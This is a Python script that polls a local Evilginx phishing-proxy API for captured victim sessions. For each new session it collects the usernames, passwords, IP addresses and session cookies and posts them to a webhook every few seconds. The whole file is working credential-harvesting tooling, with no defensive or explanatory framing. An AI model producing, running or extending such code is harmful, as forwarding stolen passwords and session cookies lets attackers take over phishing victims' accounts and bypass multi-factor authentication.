#!/usr/bin/env python3
import requests
import json
import time
import os

WEBHOOK_URL = "http://localhost:5001/webhook"
EVILGINX_API = "http://localhost:5000/api"

def get_sessions():
    try:
        response = requests.get(f"{EVILGINX_API}/sessions", timeout=5)
        if response.status_code == 200:
            return response.json().get('sessions', [])
    except:
        pass
    return []

def get_session_cookies(session_id):
    try:
        response = requests.get(f"{EVILGINX_API}/sessions/{session_id}/cookies", timeout=5)
        if response.status_code == 200:
            return response.json().get('cookies', [])
    except:
        pass
    return []

def monitor_sessions():
    processed_sessions = set()
    
    while True:
        try:
            sessions = get_sessions()
            
            for session in sessions:
                session_id = session.get('id', '')
                
                if session_id and session_id not in processed_sessions:
                    username = session.get('username', 'N/A')
                    password = session.get('password', 'N/A')
                    ip = session.get('ip', 'N/A')
                    cookies = get_session_cookies(session_id)
                    
                    data = {
                        'username': username,
                        'password': password,
                        'cookies': cookies,
                        'ip': ip
                    }
                    
                    requests.post(WEBHOOK_URL, json=data)
                    processed_sessions.add(session_id)
            
            time.sleep(3)
            
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    monitor_sessions()
